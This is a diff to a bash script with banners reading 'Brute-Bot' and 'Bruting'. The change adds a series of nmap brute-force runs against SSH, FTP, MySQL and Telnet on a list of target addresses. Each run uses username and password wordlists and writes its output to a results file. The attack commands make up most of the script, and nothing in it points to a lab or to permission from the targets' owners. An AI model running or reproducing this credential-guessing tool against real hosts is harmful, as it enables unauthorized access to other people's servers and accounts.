@@ -1,7 +1,6 @@
 #!/usr/bin/bash
 
 
-
 echo "______            _             ______       _   ";
 echo "| ___ \          | |            | ___ \     | |  ";
 echo "| |_/ /_ __ _   _| |_ ___ ______| |_/ / ___ | |_ ";
@@ -21,6 +20,7 @@ do
 	done
 done
 
+wait
 
 echo "______                _             ";
 echo "| ___ \              (_)            ";
@@ -32,7 +32,22 @@ echo "                               __/ |";
 echo "                              |___/ ";
 
 
-sudo nmap --script ssh-brute -p22 -iL octets.txt --script-args userdb=usernames.txt,passdb=passlist.txt | tee results.txt
+sudo nmap -p22 --script ssh-brute --script-args userdb=usernames.lst, passdb=passlist.lst -iL octets.txt | tee results.txt &
+
+wait
+
+sudo nmap -p21 --script ftp-brute --script-args userdb=usernames.lst, passdb=passlist.lst -iL octets.txt | tee results.txt &
+
+wait
+
+sudo nmap -p3306 --script mysql-brute --script-args userdb=usernames.lst, passdb=passlist.lst -iL octets.txt | tee results.txt &
+
+wait
+
+sudo nmap -p23 --script telnet-brute --script-args userdb=usernames.lst, passdb=passlist.lst -iL octets.txt | tee results.txt &
+
+wait
+
 rm octets.txt
 exit
 
